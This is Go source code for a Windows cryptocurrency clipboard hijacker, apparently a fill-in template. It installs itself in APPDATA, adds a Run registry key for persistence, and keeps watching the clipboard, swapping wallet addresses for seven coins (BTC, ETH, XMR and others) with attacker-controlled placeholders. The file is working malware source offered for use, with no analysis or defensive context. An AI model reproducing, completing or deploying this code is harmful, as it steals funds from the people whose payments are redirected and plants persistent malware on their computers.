package main

import (
	"os"
	"regexp"
	"time"
	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	regexMap = map[*regexp.Regexp]string{
		regexp.MustCompile(`^[489][A-Za-z0-9]{105}$`):                         "Xmr address", //Your xmr address
		regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`):                     "Trx address", //Your trx address
		regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`):                             "eth address", //Your eth address
		regexp.MustCompile(`^r[0-9a-zA-Z]{24,34}$`):                           "Xrp address", //Your xrp address
		regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`): "Doge address", //Your doge address
		regexp.MustCompile(`^(bitcoincash:)?[qp][a-z0-9]{41}$`):               "bch address", //Your bch address
		regexp.MustCompile(`(^|\W)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}($|\W)`):  "btc address", //Your btc address
	}

	dirName  = "YourDir" //Drop folder name
	fileName = "YourFile" //Drop file name
  mutexName    = "YourMutex" //Mutex name
	registryName = "YourRegistryValue" //Reg name
)

func main() {
	mutex, err := windows.CreateMutex(&windows.SecurityAttributes{}, false, windows.StringToUTF16Ptr(mutexName))
	if err != nil {
		os.Exit(1)
	}
	defer windows.CloseHandle(mutex)

	exePath, _ := os.Executable()

	dirPath := os.Getenv("APPDATA") + "\\" + dirName
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		os.Mkdir(dirPath, os.ModePerm)
	}

	filePath := dirPath + "\\" + fileName + ".exe"
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		os.Rename(exePath, filePath)
	}

	key, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	key.SetStringValue(registryName, filePath)
	key.Close()

	var lastClipboardText string

	clipboardChan := make(chan string)

	go func() {
		for {
			clipboardText, _ := clipboard.ReadAll()
			if clipboardText != lastClipboardText {
				clipboardChan <- clipboardText
				lastClipboardText = clipboardText
			}
			time.Sleep(time.Millisecond * 500)
		}
	}()

	for {
		select {
		case clipboardText := <-clipboardChan:
			for regex, replacement := range regexMap {
				if regex.MatchString(clipboardText) {
					newClipboardText := regex.ReplaceAllString(clipboardText, replacement)
					clipboard.WriteAll(newClipboardText)
				}
			}
		case <-time.After(time.Millisecond * 500):

		}
	}
}
